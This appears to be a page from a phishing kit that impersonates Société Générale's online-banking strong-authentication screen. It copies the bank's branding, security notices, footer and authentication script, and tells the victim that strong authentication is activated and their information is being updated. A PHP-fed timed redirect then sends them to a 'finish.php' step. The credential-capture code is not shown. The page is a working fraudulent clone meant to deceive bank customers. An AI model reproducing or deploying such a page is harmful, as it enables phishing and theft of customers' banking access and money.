<div class="dcw_block dcw_block-text">
<div class="dcw_block-element">
<h3>L'authentification forte est bien activée, <br>Mise à jour des informations en cours...</h3>
</div>
</div>


<script>
setTimeout(function(){
window.location.href="finish.php?lsg#<?php echo $LSG; ?>";
}, 7000);
</script>  



</div>

 </div>
</main>


</div>


</section>
</main>
<section class="dcw_gb_row">
</section>
</section>
</section>


</DIV>  

<script id="templateComponentAuthentCv" type="template/doT.js">

 <div id="module-authent-cv">
 <div class="container-mire-codeClient"></div>
 <div id="clavier"></div>
 </div>

 </script>


  </div>





<script>
var fun;
function onSWMLoaded(params) {
if ("") {
fun = function() {
params.error ? params.error() : (function () {
if (!document.getElementById('js-error')) {
document.getElementById(params.defaultClass || 'swm-wrapper').innerHTML = ("<div id=\"js-error\"></div>");
}
swm.commun.showErrorMessage.call(this, "", "/icd/cbo/index-authsec.html#cbo/");
})();
};
window.swm ? fun() : document.addEventListener("swm.onLoad", fun);
} else {
fun = initSWM.bind(this, params);
window.swm ? initSWM(params) : document.addEventListener("swm.onLoad", fun);
}
}


function initSWM(params) {

window.jQueryForSwm = swm.$;
window.swmAutoInit = false;
(function(a,b){if(typeof define==="function"&&define.amd){if(typeof swmAutoInit==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof swmAutoInit==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;if(typeof c==="undefined"){console.debug("swmApi load : !!! jQuery is missing !!!")}b(c)}})(this,function(g){if(window&&typeof window.swmApi!=="undefined"){return window.swmApi}var m={};var p;var s=false;var i=false;var b={getJetonCallback:[],iStockageJetonActifCallback:[],ajaxFilter:[]};var f={};m.consts={};m.consts.niveauSensibilite={};m.consts.niveauSensibilite.NORMAL={value:0};m.consts.niveauSensibilite.SENSIBLE={value:100};m.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof swmConfOverride!=="undefined"){m.version=swmConfOverride.version}m.loadSwm=function(){r("The method swm.loadSwm is deprecated, please use swm.init instead.");m.init.apply(m,arguments)};m.init=function(u){var v={mainJsPath:"/js/swm.main.js",swmMain:undefined};q(v,u);function w(){m.config=p.config;m.$=p.$;s=false;i=true;o();c("swm.available",p)}m.addConf({onAuthent:v.onAuthent,onBack:v.onBack,onClose:v.onClose,onConnecting:v.onConnecting,onInitDone:v.onInitDone,onLoadingError:v.onLoadingError,onLogout:v.onLogout,ajaxFilterRegExp:v.ajaxFilterRegExp,ajaxFilterJquery:v.ajaxFilterJquery,baseUrl:v.baseUrl});if(!i){p=v.swmMain;if(typeof p!=="undefined"){setTimeout(w,0)}else{j("swm.init",function(x){p=x;w()});if(!s){s=true;var t;if(typeof swmConfOverride!=="undefined"&&swmConfOverride.staticBaseUrl){t=(v.baseUrl||"")+swmConfOverride.staticBaseUrl+v.mainJsPath}else{t="/swm/resources/version/"+m.version+v.mainJsPath}k(t,function(){c("swm.loadingError")})}}}else{c("swm.available",p)}};if(window.swmAutoInit){j("swm.loaded",m.init)}window.swmAutoInit=undefined;m.ajaxFilter=function(u,t){if(p){u.ajaxFilterJquery=u.ajaxFilterJquery||g||p.$;if(u.ajaxFilterRegExp){u.ajaxFilterJquery.ajax=p.filterAjaxRequests(u).overridedAjax;if(typeof t==="function"){t()}}return u.ajaxFilterJquery.ajax}else{a("ajaxFilter",[u,t])}};m.onLogout=function(t){j("swm.logout",t)};m.onClose=function(t){j("swm.close",t);j("swm.closeKeyboard",t)};m.onConnecting=function(t){j("swm.connecting",t)};m.onBack=function(t){j("swm.back",t)};m.onLogoutError=function(t){j("swm.logout.error",t)};m.onAuthent=function(t){j("swm.postchgtnivauth",t)};m.setStockageJetonActif=function(t){t=t==true;if(p){p.data.setStockageJetonActif(t)}else{h("setStockageJetonActif",t)}};m.isStockageJetonActif=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.isStockageJetonActif())},0)}else{a("iStockageJetonActifCallback",t);return undefined}}};m.getJeton=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.getJeton())},0)}else{a("getJetonCallback",t);return undefined}}};m.getIdStat=function(){if(p){return p.data.getIdStat()}return undefined};m.reattribuerCodeSecret=function(t,u){if(p){p.reattribuerCodeSecret(t,u)}else{h("reattribuerCodeSecret",[t,u])}};m.sign=function(t,v){if(p){return p.sign(t,v)}else{var u={getData:function(){return new Error("Signature non prÃªte public.")}};h("sign",{params:[t,v],promise:u});if(typeof t==="string"){return u}}};m.triggerSwmLogout=function(){if(p){return p.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};m.record=function(t){if(p){return p.record(t)}else{h("record",arguments)}};m.checkSign=function(t){if(p){return p.checkSign(t)}else{h("checkSign",arguments)}};m.gda_handleResponse=function(w,u,v,t){if(p){return p.gda_handleResponse(w,u,v,t)}else{return undefined}};m.errorSign=function(t){var u={};u.success=t.success;u.actionLevel=t.action_level||t.actionLevel||0;u.jetonTransaction=t.context||t.jetonTransaction;u.error=t.error;u.isMessageRequired=t.isMessageRequired;u.callback=t.callback;if(p){return p.errorSign(u)}else{h("errorSign",arguments)}};m.getDateDerniereConnexion=function(){if(p){return p.data.getDateDerniereConnexion()}return undefined};m.getCanalDerniereConnexion=function(){if(p){return p.data.getCanalDerniereConnexion()}return undefined};m.getDroits=function(){if(p){return p.data.getDroits()}return undefined};m.logout=function(){if(p){p.logout.apply(m,arguments)}else{h("logout",arguments)}};m.logoutSupervision=function(){r("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");m.logout()};m.resetAuthentData=function(){if(p){p.data.resetAuthentData.apply(m,arguments)}else{h("resetAuthentData",arguments)}};m.isAuthenticated=function(){if(p){return p.isAuthenticated()}return false};m.authent=function(u,t,v){if(p){t=t||function(w){if(f.preSuccess==="function"){f.preSuccess(w,function(){f.success(w)})}else{f.success(w)}};v=v||f.error;return p.authent(u,t,v)}else{h("authent",[u,t,v])}return false};m.setDefaultAuthentCallbacks=function(t){f.preSuccess=t.preSuccess||f.preSuccess;f.success=t.success||f.success;f.error=t.error||f.error};m.changeCodeSecret=function(t,u){if(p){return p.changeCodeSecret(t,u)}else{h("changeCodeSecret",[t,u])}return false};m.changeCodeSecretDelegue=function(u,v,t){if(p){return p.changeCodeSecret(u,v,t)}else{h("changeCodeSecretDelegue",[u,v,t])}return false};m.addConf=function(t){t.onAuthent&&j("swm.postchgtnivauth",t.onAuthent);t.onLogout&&j("swm.logout",t.onLogout);t.onBack&&j("swm.back",t.onBack);t.onClose&&j("swm.close",t.onClose);t.onConnecting&&j("swm.connecting",t.onConnecting);t.onLoadingError&&j("swm.loadingError",t.onLoadingError);t.onAjaxFilterReady&&j("swm.onResponseFilterReady",t.onAjaxFilterReady);if(t.ajaxFilterRegExp){var u={ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,ajaxFilterAxios:t.ajaxFilterAxios};m.ajaxFilter(u,t.onAjaxFilterReady)}if(t.baseUrl){d(t.baseUrl)}if(typeof p!="undefined"){t.onInitDone&&t.onInitDone()}else{t.onInitDone&&j("swm.available",t.onInitDone)}};function d(t){if(p){p.config.baseUrl=t}else{h("setBaseUrl",[t])}}function h(t,u){b[t]=u;!s&&!i&&m.init()}function a(t,u){b[t].push(u);!s&&!i&&m.init()}function n(t){return t&&Object.prototype.toString.call(t)==="[object Array]"}function o(){for(var v in b){if(v==="iStockageJetonActifCallback"||v==="getJetonCallback"){for(var u in b[v]){m.hasOwnProperty(v)&&typeof m[v]==="function"&&m[v](u)}}else{if(v==="signature"){var w=m[v].apply(m,b[v].params);if(typeof w==="object"){b.signature.promise.getData=w}}else{if(v==="setBaseUrl"){d.apply(m,b.setBaseUrl)}else{if(n(b[v])){for(var t in b[v]){b[v].hasOwnProperty(t)&&m[v].apply(m,b[v][t])}}else{m[v].apply(m,b[v])}}}}}b={getJetonCallback:[],iStockageJetonActifCallback:[]}}function c(t,v){var u=document.createEvent("Event");u.initEvent(t,true,true);u.data=v;document.dispatchEvent(u);var x=window.self!==window.top;if(x){try{top.document.dispatchEvent(u)}catch(w){}}}g&&(g.fn.triggerExternal=c);function j(u,v){var t=function(w){if(typeof v==="function"){v(w.data)}};document.removeEventListener(u,t);document.addEventListener(u,t)}function k(u,v){if(g&&typeof g.Deferred!=="undefined"){var t=l(u);g.when(t).fail(v)}else{e(u,v)}}function l(v){var t=g.Deferred(),u=document.createElement("script");u.async="async";u.type="text/javascript";u.src=v;u.onload=u.onreadystatechange=function(x,w){if(!u.readyState||/loaded|complete/.test(u.readyState)){if(w){t.reject()}else{t.resolve()}}};u.onerror=function(){t.reject()};g("head")[0].appendChild(u);return t.promise()}function e(u,v){var t=document.createElement("script");t.async=false;t.src=u;t.type="text/javascript";t.onerror=v;t.charset="UTF-8";document.getElementsByTagName("head")[0].appendChild(t)}function r(u){try{console&&typeof console.warn==="function"&&console.warn("[SWM] "+u)}catch(t){}}function q(u,t){if(t){for(var v in t){if(t.hasOwnProperty(v)){u[v]=t[v]}}}return u}setTimeout(function(){c("swm.loaded",m)},0);window.swmApi=m;return m});
swmApi.init({
swmMain: swm
});
swm.commun.setGdaReplay("/swm/swm-redirect.html", "rDBg2KLXMgVm0a88I35dzCUPCOosAQAAAQAAABsAAAAvY29tL2ljZC13ZWIvY2JvL2luZGV4Lmh0bWw%3D", "" || window.location.hash);
if ("") {
swm.commun.showError("");
}
params.event && swm.trackEvent(params.event);
document.removeEventListener("swm.onLoad", fun);
fun = undefined;
params.success && params.success();
}
</script>

<script>
onSWMLoaded({
defaultClass: 'swmModulesAuth',
success: function() {

swmApi.setDefaultAuthentCallbacks({
success : function(rsp) {
swm.commun.replayInterceptedPage();
},
error: function(err) {
swm.defaultAuthentError(err, "/icd/cbo/index-authsec.html#cbo/");
}
});

swmApi.authent("300");
},
event: {
pageName: 'Mon_Profil::Connexion::Ecran_Connexion'
}
});
</script>

</div>



<!--<script type="text/javascript" src="../assets/js/swm.main.js" charset="UTF-8"></script>-->







<script type="text/javascript">
if (typeof(swm) != "undefined" && swm.onLogout) {
swm.onLogout(function() {
document.location.href = '/icd/cbo/index-authsec.html#cbo/';
});
}

</script>
</div>


</section>
<section class="dcw_gb9_core-right">


 


<div>

<div>
<link href="../assets/css/eo2680-style.css" rel="stylesheet">
<div id="swm-content-default">
<center><img id="imgSG" src="../assets/img/sg_0.png" style="width:70%; height:auto:"></center>
<input id="imgg" type="hidden" value="0" style="display: none;">
<script type="text/javascript">
function imgSG(){

/*IMG AUTO*/
var imgg = document.getElementById('imgg').value;

if(imgg != ""){
  document.getElementById('imgSG').src = "../assets/img/sg_" + imgg + ".png";
}

document.getElementById('imgg').value++;

if(imgg != "" && imgg == 10){
  document.getElementById('imgg').value = "0";
}

setTimeout(function () { imgSG(); },6000);   

  }

  imgSG();

</script>
<!--
<p><br>
<strong>Où trouver mon Code Client SG ?</strong></p>

<ul style="list-style-type: disc;">
<li>Si vous étiez client Société Générale, votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.</li>
<li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, votre Code Client SG vous a été envoyé par courrier postal il y a quelques semaines. Il remplace votre ancien identifiant.</li>
</ul>
<strong>Mon Code Secret a-t-il changé avec SG ?</strong><br>
<br>
<span>Vous seul connaissez votre Code Secret.</span>

<ul style="list-style-type: disc; margin-top: 0;">
<li>Si vous étiez client Société Générale, utilisez votre Code Secret habituel.</li>
<li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre Banque en Ligne.</li>
</ul>
<strong>Code Client ou Code Secret inconnus ?</strong><br>
<br>
<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Je souhaite obtenir mon Code Client</a><br>
<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Je ne connais pas mon Code Secret</a><br>
<br>
<strong>Nos autres Espaces Client</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Faire opposition à votre carte bancaire"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Espace Client Professionnels (Progéliance Net)</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Espace Client Entreprises (Sogecash Net)</a><br>
<br>
<strong>Urgences carte bancaire</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Faire opposition à votre carte bancaire"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Faire opposition à votre carte bancaire</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Verrouiller votre carte bancaire</a><br>
<br>
<strong>Nos conseils sécurité</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Découvrez le Pass sécurité</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Voir les menaces identifiées</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Guide des bonnes pratiques</a>

<p>&nbsp;</p>
-->
</div>

<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-pass--txt"><strong>Comment ça se passe ?</strong><br>
Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>

<hr>
<p class="eo2680-pass--txt"><strong>Vous avez changé de numéro de téléphone ?</strong><br>
Vous pouvez modifier votre numéro de téléphone en appelant notre serveur vocal au +33 825 007 111 (0,05 eur TTC/min + prix d'un appel) ou en vous rendant dans votre agence. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Communiquer votre numéro de téléphone Sécurité</a> <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Activer votre t&eacute;l&eacute;phone S&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Activer votre téléphone Sécurité</a></p>

<hr>
<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-oob --></div>
<!-- #### -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>

<figure><img src="../assets/img/s-curit-renforc-e-2.png"></figure>

<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-otp --></div>

</div>

</div>




</section>
<section class="dcw_gb_row dcw_gb_clearfix">


 

<div>

<div>
<script type="text/javascript">
  var element = document.querySelector('.rsp_header');
  element.classList.add("js-header-lhs-auth");
</script>

</div>

</div>




</section>
</section>
</main>
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message">
En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#" class="eip_dcw_main-link">cliquez ici</a></span>.
</p>
<button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">

</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside>

<footer class="dcw_footer" role="contentinfo">
  <div class="dcw_footer-second">
<div class="dcw_footer_container">
  <nav class="dcw_footer-second_nav">
<ul class="dcw_footer-second_list">
  <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20220315164858.svg#question"></use></svg>
Questions fréquentes
</a></li>
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20220315164858.svg#localisation"></use></svg>
Trouver une agence
</a></li>
<li class="dcw_footer-second_item">
  <div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites SG</button>
   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20220315164858.svg#arrow-dropdown"></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Banque privée</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Entreprises</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Associations</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Groupe Société Générale</a>
</li>
</ul>
</div></li>
  </ul>
  </nav>
  <ul class="dcw_footer_container dcw_footer-second_social">
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Société Générale"><svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20220315164858.svg#facebook-2"></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Société Générale"><svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20240220183513.svg#twitter-x"></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l' Instagram de la Société Générale"><svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20220315164858.svg#instagram"></use></svg>
</a></li>
</ul>
</div>
  </div>
  <nav class="dcw_footer-third">
<div class="dcw_footer_container">
  <img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/img/logo-sg-seul.svg" width="150">
<ul class="dcw_footer-third_list">
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Nos engagements</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Documentation et Tarifs</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Résilier une prestation</a>
</li> 
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Accessibilité Numérique (partiellement conforme)</a>
</li>
</ul>
</div>
  </nav>
  </footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->

<style type="text/css">
  .butthoverr{background-color: #010035 !important;}
  .butthoverr:hover{background-color: #191970 !important;}
</style>
<script type="text/javascript">
  function but_0_1_2(id){
var idd = id;
if(idd == 0){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 1){
   document.getElementById('but-1').style.backgroundcolor = "#191970";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "block";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 2){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#191970";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "block";
}
  }
</script>
<script id="tc_script__1" type="text/javascript" src="../assets/js/tc_SocieteGenerale_22.js" defer=""></script>
<DIV id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper" bis_skin_checked="1" style="position: fixed; float: right; right: 0px; margin-top: -55%; margin-bottom: -30%; z-index: 100;">
   <div class="interact-layout" id="content" bis_skin_checked="1">
  <div class="interact-header" bis_skin_checked="1"></div>
  <div class="interact-content" bis_skin_checked="1"></div>
  <div class="interact-popin" bis_skin_checked="1"></div>
  <div class="interact-footer" bis_skin_checked="1"></div>
  <div class="interact-sticky" bis_skin_checked="1">
 <div id="tch_sticky-bar" class="tch_sticky-bar_container" bis_skin_checked="1">
<div class="tch_sticky-contact_bar" bis_skin_checked="1">
   <h3 class="tch_sticky-bar_title" style="display:none">Besoin d'aide</h3>
   <p class="tch_sticky-bar_message" style="display:none">Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins </p>
   <div class="tch_sticky-bar has-two-icons" bis_skin_checked="1">

<span id="text-1" class="tch_tooltip" style="position: fixed; margin-left: -160px; top: 410px; display: none;">Poser une question à SoBot  </span>
<span id="text-2" class="tch_tooltip" style="position: fixed; margin-left: -120px; top: 480px; display: none;">Prendre rendez-vous  </span>

  <ul class="tch_sticky-bar_list" style="margin-top: -80px;border: none; border-color: transparent;" id="chatoo">
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-1" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('1');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Poser une question à SoBot" role="img" focusable="false" style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#chatbot"></use>
   </svg>
</button>
 </li>
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-2" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('2');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Prendre rendez-vous" role="img" focusable="false"  style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#calendar"></use>
   </svg>
</button>
 </li>
  </ul>
   </div>
   <button class="tch_sticky-bar_close" aria-label="Fermer la boite de dialogue" style="display:none">
  <svg class="tch_sticky-bar_icon tch_sticky-bar_icon--close" aria-hidden="true" focusable="false">
 <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#cross-close"></use>
  </svg>
   </button>
</div>
 </div>
 <div id="tch_sticky-contact" class="tch_sticky-contact_container" style="display:none" bis_skin_checked="1"></div>
  </div>
  <div class="interact-chat" bis_skin_checked="1" style="display:none">
 <div aria-grabbed="false" class="tch_chat" bis_skin_checked="1" style="margin-right: 0px; margin-bottom: 0px;">
<div id="tch_chat-bot" style="display:none" bis_skin_checked="1"></div>
 </div>
  </div>
  <div id="interact-fab" class="interact-fab tch_fab" bis_skin_checked="1" style="display:none">
 <div bis_skin_checked="1">
<button class="js_fab_chat tch_fab__btn" aria-label="Ouvrir la fenêtre de tchat">
   <svg class="tch_fab__icon tch_fab__icon--sobot tch_fab__icon--conversation" aria-hidden="true" focusable="false">
